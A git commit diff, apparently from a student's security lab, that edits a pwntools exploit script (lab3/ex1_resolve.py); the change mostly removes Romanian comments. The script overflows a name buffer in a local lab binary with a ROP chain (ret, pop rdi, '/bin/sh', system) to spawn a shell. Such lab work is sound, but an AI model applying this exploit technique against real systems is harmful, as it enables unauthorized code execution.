3e694877ad3074f3d177dfb6a05030a8005dbcac
Radu Rares <radurares10mai@gmail.com>
2025-12-04 16:47:03 -0500

    Inceput ex2

--- lab3/ex1_resolve.py
+++ lab3/ex1_resolve.py
@@ -7,28 +7,28 @@ context.log_level = 'debug'
 OFFSET = 344  # calculat in gdb: (long)($rbp + 8) - (long)&name
 
 SYSTEM      = 0x7ffff7dff110     # p system
-BINSH       = 0x7ffff7f53ea4     # find &system, +9999999, "/bin/sh"
-POP_RDI_RET = 0x7ffff7dd6145     # p/x (system - 0x53110) + 0x2a145, verificat cu x/4i
-RET         = 0x401016           # gadget 'ret' din binar
+BINSH       = 0x7ffff7f53ea4     #search "/bin/sh"
+POP_RDI_RET = 0x7ffff7dd6145     # pop rdi ; ret
+RET         = 0x401016           #  'ret' din binar
 
 def build_payload():
     payload  = b"A" * OFFSET
-    payload += p64(RET)          # FIX: realiniere stack
-    payload += p64(POP_RDI_RET)  # pop rdi ; ret
-    payload += p64(BINSH)        # RDI = &"/bin/sh"
-    payload += p64(SYSTEM)       # system("/bin/sh")
+    payload += p64(RET)          
+    payload += p64(POP_RDI_RET)  
+    payload += p64(BINSH)       
+    payload += p64(SYSTEM)       
     return payload
 
 def main():
     io = process('./bin/ex1')
 
-    # Selectăm un airline valid
+   
     io.sendlineafter(b"Select an airline:", b"0")
 
-    # Overflow în name cu ROP chain
+    
     io.sendlineafter(b"Please input your name to check your booking:", build_payload())
 
-    # Ar trebui să fim în shell
+    
     io.interactive()
 
 if __name__ == "__main__":
